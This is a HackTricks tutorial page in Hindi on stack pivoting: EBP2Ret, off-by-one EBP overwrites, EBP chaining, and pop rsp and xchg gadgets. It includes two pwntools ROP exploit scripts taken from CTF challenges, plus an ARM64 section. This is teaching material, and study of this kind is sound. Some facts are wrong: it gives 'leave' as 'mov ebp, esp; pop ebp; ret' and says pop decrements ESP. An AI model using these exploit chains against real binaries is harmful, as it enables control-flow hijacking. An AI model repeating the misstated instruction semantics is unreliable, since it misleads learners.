# Stack Pivoting - EBP2Ret - EBP chaining

{{#include ../../banners/hacktricks-training.md}}

## Basic Information

यह तकनीक **Base Pointer (EBP)** को नियंत्रित करने की क्षमता का लाभ उठाती है ताकि EBP रजिस्टर और **`leave; ret`** निर्देश अनुक्रम के सावधानीपूर्वक उपयोग के माध्यम से कई कार्यों के निष्पादन को श्रृंखला में जोड़ा जा सके।

याद दिलाने के लिए, **`leave`** का मूल अर्थ है:
```
mov       ebp, esp
pop       ebp
ret
```
और चूंकि **EBP स्टैक में** EIP से पहले है, इसलिए इसे नियंत्रित करना संभव है स्टैक को नियंत्रित करके।

### EBP2Ret

यह तकनीक विशेष रूप से उपयोगी है जब आप **EBP रजिस्टर को बदल सकते हैं लेकिन EIP रजिस्टर को सीधे बदलने का कोई तरीका नहीं है**। यह कार्यों के व्यवहार का लाभ उठाता है जब वे निष्पादन समाप्त करते हैं।

यदि, `fvuln` के निष्पादन के दौरान, आप स्टैक में एक **नकली EBP** इंजेक्ट करने में सफल होते हैं जो मेमोरी के उस क्षेत्र की ओर इशारा करता है जहां आपका शेलकोड का पता स्थित है (प्लस 4 बाइट्स `pop` ऑपरेशन के लिए), तो आप अप्रत्यक्ष रूप से EIP को नियंत्रित कर सकते हैं। जैसे ही `fvuln` लौटता है, ESP को इस तैयार स्थान पर सेट किया जाता है, और अगला `pop` ऑपरेशन ESP को 4 से घटाता है, **जिससे यह प्रभावी रूप से एक पते की ओर इशारा करता है जिसे हमलावर ने वहां स्टोर किया है।**\
ध्यान दें कि आपको **2 पते जानने की आवश्यकता है**: वह जहां ESP जाने वाला है, जहां आपको उस पते को लिखने की आवश्यकता होगी जिस पर ESP इशारा करता है।

#### एक्सप्लॉइट निर्माण

पहले आपको एक **पता जानने की आवश्यकता है जहां आप मनमाने डेटा / पते लिख सकते हैं**। ESP यहां इशारा करेगा और **पहला `ret` चलाएगा**।

फिर, आपको उस पते के बारे में जानने की आवश्यकता है जिसका उपयोग `ret` द्वारा **मनमाना कोड निष्पादित करने के लिए** किया जाएगा। आप उपयोग कर सकते हैं:

- एक मान्य [**ONE_GADGET**](https://github.com/david942j/one_gadget) पता।
- **`system()`** का पता उसके बाद **4 जंक बाइट्स** और `"/bin/sh"` का पता (x86 बिट्स)।
- एक **`jump esp;`** गैजेट ([**ret2esp**](../rop-return-oriented-programing/ret2esp-ret2reg.md)) का पता उसके बाद **निष्पादित करने के लिए शेलकोड**।
- कुछ [**ROP**](../rop-return-oriented-programing/) श्रृंखला

याद रखें कि नियंत्रित मेमोरी के किसी भी इन पते से पहले, **`4` बाइट्स** होनी चाहिए क्योंकि **`pop`** भाग `leave` निर्देश का है। इन 4B का दुरुपयोग करना संभव होगा एक **दूसरा नकली EBP** सेट करने के लिए और निष्पादन को नियंत्रित करना जारी रखने के लिए।

#### ऑफ-बाय-वन एक्सप्लॉइट

इस तकनीक का एक विशिष्ट रूप "ऑफ-बाय-वन एक्सप्लॉइट" के रूप में जाना जाता है। इसका उपयोग तब किया जाता है जब आप **केवल EBP के सबसे कम महत्वपूर्ण बाइट को संशोधित कर सकते हैं**। ऐसे मामले में, मेमोरी स्थान जो **`ret`** के साथ कूदने के लिए पता संग्रहीत करता है, EBP के साथ पहले तीन बाइट्स को साझा करना चाहिए, जिससे अधिक सीमित परिस्थितियों के साथ समान हेरफेर की अनुमति मिलती है।\
आमतौर पर इसे बाइट 0x00 को संशोधित किया जाता है ताकि जितना संभव हो सके कूद सके।

इसके अलावा, स्टैक में एक RET स्लेड का उपयोग करना और असली ROP श्रृंखला को अंत में रखना सामान्य है ताकि यह अधिक संभावना हो कि नया ESP RET SLED के अंदर इशारा करता है और अंतिम ROP श्रृंखला निष्पादित होती है।

### **EBP चेनिंग**

इसलिए, स्टैक के `EBP` प्रविष्टि में एक नियंत्रित पता डालना और `EIP` में `leave; ret` का पता डालना संभव है **स्टैक से नियंत्रित `EBP` पते पर `ESP` को स्थानांतरित करना**।

अब, **`ESP`** नियंत्रित है जो एक इच्छित पते की ओर इशारा कर रहा है और निष्पादित करने के लिए अगला निर्देश `RET` है। इसका दुरुपयोग करने के लिए, नियंत्रित ESP स्थान में यह रखा जा सकता है:

- **`&(next fake EBP)`** -> `leave` निर्देश से `pop ebp` के कारण नया EBP लोड करें
- **`system()`** -> `ret` द्वारा कॉल किया गया
- **`&(leave;ret)`** -> सिस्टम समाप्त होने के बाद कॉल किया जाएगा, यह ESP को नकली EBP पर ले जाएगा और फिर से शुरू करेगा
- **`&("/bin/sh")`**-> `system` के लिए पैरामीटर

बुनियादी रूप से इस तरीके से कई नकली EBPs को जोड़ना संभव है ताकि कार्यक्रम के प्रवाह को नियंत्रित किया जा सके।

यह [ret2lib](../rop-return-oriented-programing/ret2lib/) की तरह है, लेकिन अधिक जटिल है जिसमें कोई स्पष्ट लाभ नहीं है लेकिन कुछ किनारे के मामलों में दिलचस्प हो सकता है।

इसके अलावा, यहां आपके पास एक [**चुनौती का उदाहरण**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave) है जो इस तकनीक का उपयोग करता है एक **स्टैक लीक** के साथ एक विजेता फ़ंक्शन को कॉल करने के लिए। यह पृष्ठ से अंतिम पेलोड है:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBP का उपयोग नहीं किया जा सकता

जैसा कि [**इस पोस्ट में समझाया गया है**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), यदि एक बाइनरी कुछ ऑप्टिमाइजेशन के साथ संकलित की गई है, तो **EBP कभी भी ESP को नियंत्रित नहीं करता**, इसलिए, EBP को नियंत्रित करके काम करने वाला कोई भी एक्सप्लॉइट मूल रूप से विफल हो जाएगा क्योंकि इसका कोई वास्तविक प्रभाव नहीं है।\
यह इसलिए है क्योंकि **प्रोलॉग और एपिलॉग बदलते हैं** यदि बाइनरी ऑप्टिमाइज्ड है।

- **ऑप्टिमाइज्ड नहीं:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
- **अनुकूलित:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSP को नियंत्रित करने के अन्य तरीके

### **`pop rsp`** गैजेट

[**इस पृष्ठ पर**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) आप इस तकनीक का उपयोग करते हुए एक उदाहरण पा सकते हैं। इस चुनौती के लिए 2 विशिष्ट तर्कों के साथ एक फ़ंक्शन को कॉल करना आवश्यक था, और वहाँ एक **`pop rsp` गैजेट** था और वहाँ **स्टैक से लीक** है:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp gadget
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
### jmp esp

यहाँ ret2esp तकनीक की जाँच करें:

{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

## संदर्भ और अन्य उदाहरण

- [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
- [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)
- [https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html](https://guyinatuxedo.github.io/17-stack_pivot/dcquals19_speedrun4/index.html)
- 64 बिट, एक से बाहर शोषण एक रॉप श्रृंखला के साथ जो एक ret sled से शुरू होती है
- [https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html](https://guyinatuxedo.github.io/17-stack_pivot/insomnihack18_onewrite/index.html)
- 64 बिट, कोई relro, कैनरी, nx और pie नहीं। प्रोग्राम स्टैक या pie के लिए एक लीक प्रदान करता है और एक qword का WWW। पहले स्टैक लीक प्राप्त करें और pie लीक प्राप्त करने के लिए WWW का उपयोग करें। फिर एक स्थायी लूप बनाने के लिए WWW का उपयोग करें जो `.fini_array` प्रविष्टियों का दुरुपयोग करता है + `__libc_csu_fini` को कॉल करता है ([यहाँ अधिक जानकारी](../arbitrary-write-2-exec/www2exec-.dtors-and-.fini_array.md)). इस "स्थायी" लेखन का दुरुपयोग करते हुए, .bss में एक ROP श्रृंखला लिखी जाती है और अंततः इसे RBP के साथ पिवटिंग करने के लिए कॉल किया जाता है।

## ARM64

ARM64 में, कार्यों के **प्रोलॉग और एपिलॉग** स्टैक में **SP रजिस्टर को स्टोर और पुनर्प्राप्त नहीं करते**। इसके अलावा, **`RET`** निर्देश SP द्वारा इंगित पते पर वापस नहीं लौटता, बल्कि **`x30`** के अंदर के पते पर लौटता है।

इसलिए, डिफ़ॉल्ट रूप से, केवल एपिलॉग का दुरुपयोग करके आप **SP रजिस्टर को नियंत्रित नहीं कर पाएंगे** कुछ डेटा को स्टैक के अंदर ओवरराइट करके। और यदि आप SP को नियंत्रित करने में सफल होते हैं, तो भी आपको **`x30`** रजिस्टर को नियंत्रित करने का एक तरीका चाहिए।

- प्रोलॉग

```armasm
sub sp, sp, 16
stp x29, x30, [sp]      // [sp] = x29; [sp + 8] = x30
mov x29, sp             // FP फ्रेम रिकॉर्ड की ओर इशारा करता है
```

- एपिलॉग

```armasm
ldp x29, x30, [sp]      // x29 = [sp]; x30 = [sp + 8]
add sp, sp, 16
ret
```

> [!CAUTION]
> ARM64 में स्टैक पिवटिंग के समान कुछ करने का तरीका होगा **`SP`** को नियंत्रित करना (किसी रजिस्टर को नियंत्रित करके जिसका मान `SP` को पास किया जाता है या क्योंकि किसी कारण से `SP` अपना पता स्टैक से ले रहा है और हमारे पास एक ओवरफ्लो है) और फिर **एपिलॉग का दुरुपयोग** करके **`x30`** रजिस्टर को **नियंत्रित `SP`** से लोड करना और **`RET`** करना।

इसके अलावा, निम्नलिखित पृष्ठ पर आप **ARM64 में Ret2esp** का समकक्ष देख सकते हैं:

{{#ref}}
../rop-return-oriented-programing/ret2esp-ret2reg.md
{{#endref}}

{{#include ../../banners/hacktricks-training.md}}
